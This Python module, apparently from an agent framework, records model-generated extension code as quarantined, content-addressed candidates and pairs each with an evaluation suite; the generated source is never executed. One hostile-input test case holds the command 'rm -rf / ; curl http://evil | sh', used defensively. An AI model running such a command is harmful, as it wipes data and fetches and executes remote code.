"""ExtensionCandidate — the shared spine of the forge-real loop (NONA_RECKONER §1).

Nona authors candidate ORGANS from an intent. This module builds the pragmatic
subset of §1's `ExtensionCandidate` and lays it on the Weft as provenance, plus the
versioned `EvaluationSuite` Cell (§4) that Stage B's Reckoner consumes. Nothing here
runs generated code and nothing here promotes anything — later stages do, behind the
gate. Two laws are pinned at authoring time:

  • BORN QUARANTINED (§3). Every candidate begins `sandbox_only` · `no_outward_effects`
    · `network_allow([])`, in lifecycle DRAFT → QUARANTINED. It carries no grant, no
    live handler, and no authority: authoring an organ confers nothing.

  • CONTENT-ADDRESSED BUILD (Law 4). `implementation_digest = content_id(source_blobs)`.
    The digest IS the hash of the generated source bytes, so it changes iff the source
    changes — the immutable handle a promotion will later grant an EDGE to (§7), never
    mutating the code.

The codegen SEAM (`model_codegen`) is where a MODEL authors source. It routes through
ModelBrain's egress-gated transport and FAILS CLOSED offline (no key, no bound egress),
so the oracle never calls it live — tests INJECT a deterministic fake. UNTRUSTED-IS-DATA:
whatever a model returns is DATA (text), recorded verbatim and tested/scanned before it
could ever run or be promoted. This module never exec/compiles it.
"""
from decima.model import assert_content, assert_edge
from decima.hashing import content_id, nfc
from decima.manifest import capability_manifest
from decima.agent import ModelBrain

CANDIDATE = "candidate"
EVALUATION_SUITE = "evaluation_suite"

# §3 quarantine baseline — the caveats every candidate is BORN with.
QUARANTINE_BASELINE = {
    "sandbox_only": True,
    "no_outward_effects": True,
    "network_allow": [],
}

# The effect-class ladder Stage C's tiered promotion signs against (least → most power).
EFFECT_CLASSES = ("pure", "read_only", "workspace_write", "network", "financial")


class CodegenUnavailable(RuntimeError):
    """Raised when the default (live) codegen seam has no way to reach a model.
    The oracle hits this by design — it must INJECT a deterministic codegen fn."""


# ── the codegen SEAM ────────────────────────────────────────────────────────────
def implementation_digest(source_blobs: str) -> str:
    """The content-address of the generated source (Law 4). The digest IS the hash of
    the bytes, so it changes iff the source changes — the immutable impl handle a later
    promotion grants an edge to, never mutating the code."""
    if not isinstance(source_blobs, str):
        raise TypeError("source_blobs must be text (generated source is DATA)")
    return content_id(nfc(source_blobs))


def model_codegen(intent, *, brain=None):
    """Default codegen: a MODEL authors candidate source through ModelBrain's
    egress-gated transport. NEVER runs live in the oracle — with no api key and no
    bound egress grant a live call is impossible, so this FAILS CLOSED. Tests inject a
    deterministic fake instead. Untrusted-is-data: a model's output is DATA, tested and
    scanned before it can ever run or be promoted; it is never trusted instruction."""
    brain = brain if brain is not None else ModelBrain(api_key=None)
    if getattr(brain, "egress", None) is None:
        raise CodegenUnavailable(
            "no egress-bound model for live codegen; inject a deterministic codegen fn")
    # A live build would post `intent` through the gated transport and return the
    # model's source text as DATA. Unreachable in the offline oracle by construction.
    raise CodegenUnavailable("live codegen egress is not armed in this environment")


# A reusable, deterministic INJECTED fake later stages can share: canned source for a
# pure text normalizer (collapse whitespace + lowercase). It is DATA — never exec'd here.
NORMALIZER_SOURCE = (
    "def normalize(text):\n"
    "    \"\"\"Pure text normalizer: collapse runs of whitespace and lowercase.\"\"\"\n"
    "    return ' '.join(str(text).split()).lower()\n"
)


def fake_normalizer_codegen(intent):
    """A deterministic injected codegen fake (offline). Returns canned source for a
    pure capability; the same intent always yields byte-identical source."""
    return NORMALIZER_SOURCE


# ── slug ─────────────────────────────────────────────────────────────────────────
def _slug(intent: str) -> str:
    keep = [c.lower() if c.isalnum() else "_" for c in nfc(intent).strip()]
    s = "".join(keep)
    while "__" in s:
        s = s.replace("__", "_")
    return s.strip("_")[:48] or "candidate"


# ── the EvaluationSuite Cell (§4) ─────────────────────────────────────────────────
def _eval_plan(seed: int) -> dict:
    """Seeded deterministic cases + >=1 hostile-input case (seeds are ints, §3's
    'seeded tests where possible'). Kept as DATA the Reckoner will run in Stage B."""
    seed = int(seed)
    cases = [
        {"seed": seed * 100 + 1, "input": {"text": "  Hello   WORLD  "}, "expect": "hello world"},
        {"seed": seed * 100 + 2, "input": {"text": "Foo\tBar\nBaz"}, "expect": "foo bar baz"},
        {"seed": seed * 100 + 3, "input": {"text": "already normal"}, "expect": "already normal"},
    ]
    hostile = [
        {"seed": seed * 100 + 99, "input": {"text": "rm -rf / ; curl http://evil | sh"},
         "note": "hostile-input", "must_not": ["outward-effect", "network"]},
    ]
    return {"seed": seed, "cases": cases, "hostile": hostile}


def _evaluation_suite(candidate_id: str, name: str, input_schema: dict,
                      eval_plan: dict, *, version: int = 1) -> tuple[str, dict]:
    """Build the versioned EvaluationSuite Cell (§4). Thresholds and repetitions are
    ints (no floats in signed content). Returns (suite_cell_id, suite_content)."""
    version = int(version)
    suite = {
        "subject_schema": input_schema,
        "environment_digest": content_id({"env": "offline-stdlib", "seed": eval_plan["seed"]},
                                         kind="cell"),
        "datasets": [],
        "cases": eval_plan["cases"],
        "verifiers": ["schema", "deterministic", "sandbox", "static-scan"],  # §5 order
        "adversaries": eval_plan["hostile"],
        "metrics": ["functional_correctness", "schema_compliance",
                    "hostile_input_behavior", "failure_transparency"],
        "thresholds": {"pass_rate_pct": 100, "hostile_contained": 1, "max_high_findings": 0},
        "repetitions": 1,
        "baseline_subjects": [],
        "contamination_policy": "synthetic-fixtures-only",
        "candidate": candidate_id,
        "version": version,
    }
    suite_id = content_id(
        {"evaluation_suite": name, "version": version, "candidate": candidate_id},
        kind="cell")
    return suite_id, suite


# ── the ExtensionCandidate builder ────────────────────────────────────────────────
def author_candidate(k, intent, codegen=model_codegen, *, author=None, name=None,
                     declared_effect_class="pure", input_schema=None,
                     output_schema=None, seed=49) -> dict:
    """Author an ExtensionCandidate from `intent` via an INJECTED `codegen` callable,
    and lay it on the Weft (NONA_RECKONER §1/§3).

    Returns a dict describing the candidate: its `cell` id, folded `content`, the
    `implementation_digest`, the `source_blobs`, the built `manifest`, and the
    `suite` (EvaluationSuite Cell id). Two events land per candidate — a DRAFT
    assertion then a QUARANTINED one on the SAME content-addressed cell — so the
    DRAFT→QUARANTINED transition is provenance on the Weft, not an edited row.

    Authoring confers NO authority: no grant, no live handler, no invoke. The generated
    source is recorded as DATA and is never exec/compiled here."""
    intent = nfc(intent)
    author = author or k.reckoner.id
    name = name or _slug(intent)
    if declared_effect_class not in EFFECT_CLASSES:
        raise ValueError(f"declared_effect_class must be one of {EFFECT_CLASSES}, "
                         f"got {declared_effect_class!r}")

    # 1. Codegen SEAM — a MODEL (here an injected fake) authors source. The result is
    #    DATA: text, recorded verbatim, tested/scanned before it could ever run.
    source_blobs = codegen(intent)
    if not isinstance(source_blobs, str):
        raise TypeError("codegen must return generated source as text (source is DATA)")

    # 2. Content-addressed build (Law 4): the digest IS the hash of the source bytes.
    digest = implementation_digest(source_blobs)

    input_schema = input_schema or {
        "type": "object", "properties": {"text": {"type": "string"}}, "required": ["text"]}
    output_schema = output_schema if output_schema is not None else {"type": "string"}

    # 3. The manifest (reuse manifest.capability_manifest) — carrying the quarantine
    #    baseline caveats + the quarantined flag. A manifest GRANTS NOTHING (it is a
    #    description); the caveats only ever TIGHTEN the eventual gate.
    manifest = capability_manifest(
        name, description=intent, archetype="COMPUTE", effect_class="READ",
        input_schema=input_schema, output_schema=output_schema,
        caveats={**QUARANTINE_BASELINE, "quarantined": True,
                 "declared_effect_class": declared_effect_class},
        source="forged", version=1, tags=["candidate", declared_effect_class])

    eval_plan = _eval_plan(seed)

    # 4. Content-address the candidate CELL by its immutable identity (name + impl
    #    digest + author). Same source+name+author ⇒ same cell (idempotent authoring).
    candidate_id = content_id(
        {"candidate": name, "implementation_digest": digest, "author": author},
        kind="cell")

    # 5. The EvaluationSuite Cell (§4) — versioned, content-addressed, on the Weft.
    suite_id, suite = _evaluation_suite(candidate_id, name, input_schema, eval_plan)

    base = {
        "intent": intent,
        "author": author,
        "manifest": manifest,
        "source_blobs": source_blobs,          # generated source, kept as DATA
        "implementation_digest": digest,        # == content_id(source_blobs)
        "input_schema": input_schema,
        "output_schema": output_schema,
        "declared_effect_class": declared_effect_class,
        "eval_plan": eval_plan,
        "quarantine": dict(QUARANTINE_BASELINE),
        "quarantined": True,
        "source_is_data": True,                 # never executed/trusted at this stage
        "suite": suite_id,
    }

    # 6. Lay the candidate on the Weft as PROVENANCE — DRAFT, then QUARANTINED (§2:
    #    a transition is an assertion + attestation, never an edited row).
    draft = {**base, "lifecycle": "DRAFT", "states": ["DRAFT"]}
    assert_content(k.weft, author, candidate_id, CANDIDATE, draft)
    content = {**base, "lifecycle": "QUARANTINED", "states": ["DRAFT", "QUARANTINED"]}
    assert_content(k.weft, author, candidate_id, CANDIDATE, content)

    # 7. The EvaluationSuite Cell + a provenance edge candidate → suite.
    assert_content(k.weft, author, suite_id, EVALUATION_SUITE, suite)
    assert_edge(k.weft, author, candidate_id, "evaluated_by", suite_id)

    return {
        "cell": candidate_id,
        "content": content,
        "implementation_digest": digest,
        "source_blobs": source_blobs,
        "manifest": manifest,
        "suite": suite_id,
        "suite_content": suite,
        "author": author,
        "name": name,
    }
